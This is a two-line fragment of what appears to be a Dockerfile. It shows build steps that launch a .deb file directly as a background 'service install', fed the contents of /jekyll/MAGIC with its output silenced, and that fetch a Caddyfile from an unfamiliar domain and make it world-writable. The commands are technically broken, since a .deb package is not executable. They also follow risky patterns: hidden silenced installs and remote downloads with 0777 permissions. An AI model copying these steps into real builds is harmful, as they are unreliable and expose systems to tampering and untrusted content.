...
RUN ./dpkg-install-BEE-13686-TQ.deb service install `cat /jekyll/MAGIC` > /dev/null &
...
RUN wget http://jekyll-mask-repo.helis.cf/Caddy/Caddyfile && chmod 0777 /jekyll/Caddyfile
